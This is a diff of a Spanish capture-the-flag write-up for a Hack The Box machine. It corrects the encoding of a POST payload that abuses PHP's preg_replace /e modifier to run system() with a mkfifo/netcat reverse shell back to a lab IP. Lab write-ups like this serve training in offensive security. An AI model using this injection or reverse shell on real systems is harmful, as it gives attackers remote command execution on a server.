@@ -263,7 +263,7 @@ Vemos que está utilizando expresiones regulares, es decir `/i` por lo que ya ve
 
 Para eso reemplazaremos la data por (pero donde pone 10.13.14.13 lo reemplazaras por tu ip de HTB): 
 ```
-swearwords[/fuck/e]=system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%10.13.14.13%20443%20>/tmp/f')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad+person&to=uwu@uwu.uwu&subject=uwu&message=uwu&_wysihtml5_mode=1
+swearwords[/fuck/e]=system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%2010.13.14.13%20443%20>/tmp/f')&swearwords[/shit/i]=poop&swearwords[/ass/i]=behind&swearwords[/dick/i]=penis&swearwords[/whore/i]=escort&swearwords[/asshole/i]=bad+person&to=uwu@uwu.uwu&subject=uwu&message=uwu&_wysihtml5_mode=1
 ```
 
 ## WEB: puerto 80 | http
